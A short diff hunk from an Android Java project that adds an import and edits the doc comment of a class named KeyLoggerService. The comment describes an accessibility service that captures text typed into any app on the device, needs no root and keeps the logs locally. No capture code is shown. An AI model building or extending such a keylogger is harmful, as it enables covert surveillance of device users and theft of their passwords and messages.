@@ -3,10 +3,12 @@ package com.keyrecord.app;
 import android.accessibilityservice.AccessibilityService;
 import android.view.accessibility.AccessibilityEvent;
 
+import com.osfans.trime.R;
+
 /**
  * Captures text typed into any app on this device through the Accessibility
  * API (no root required). Everything is written locally via LogManager and is
- * never transmitted off the device.
+ * never transmitted off the device (this app declares no INTERNET permission).
  */
 public class KeyLoggerService extends AccessibilityService {
 
